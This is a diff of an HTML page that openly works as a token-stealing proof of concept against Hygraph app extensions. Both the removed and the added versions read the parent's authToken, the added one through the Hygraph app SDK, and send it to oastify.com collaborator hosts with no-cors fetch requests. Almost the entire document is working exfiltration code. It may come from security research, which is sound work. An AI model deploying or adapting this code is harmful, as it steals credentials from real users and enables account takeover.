@@ -1,20 +1,28 @@
+<!DOCTYPE html>
 <html>
+<head>
+  <script src="https://unpkg.com/@graphcms/zoid@9.0.64-alpha.1/lib/zoid.js"></script>
+  <script src="https://unpkg.com/@hygraph/app-sdk@1.0.0-beta.13/dist/app-sdk.umd.production.min.js"></script>
+</head>
 <body>
+  <div id="output">Attempting Capture...</div>
   <script>
     (function() {
-      try {
-        // Decode the state injected by the parent
-        const rawData = window.name ? JSON.parse(atob(window.name)) : null;
-        const token = rawData?.props?.context?.environment?.authToken;
+      const urlParams = new URLSearchParams(window.location.search);
+      const uid = urlParams.get('extensionUid'); // Hygraph sends this automatically
+      const SDK = window['@hygraph/app-sdk'];
 
-        if (token) {
-          fetch("https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/", {
-            method: "POST",
-            mode: "no-cors", // Ensures the request fires even if CORS fails
-            body: JSON.stringify({ token: token, origin: window.location.href })
-          });
-        }
-      } catch(e) {}
+      if (SDK && uid) {
+        SDK.init({ uid: uid, onProps: function(props) {
+          const token = props.context.environment.authToken;
+          document.getElementById('output').textContent = "TOKEN CAPTURED";
+          
+          // Send to your Oastify
+          fetch("https://94bs1fn8p294xh9nx6dmi18uolufi66v.oastify.com/?token=" + token, { mode: 'no-cors' });
+        }});
+      } else {
+        document.getElementById('output').textContent = "SDK or UID Missing";
+      }
     })();
   </script>
 </body>
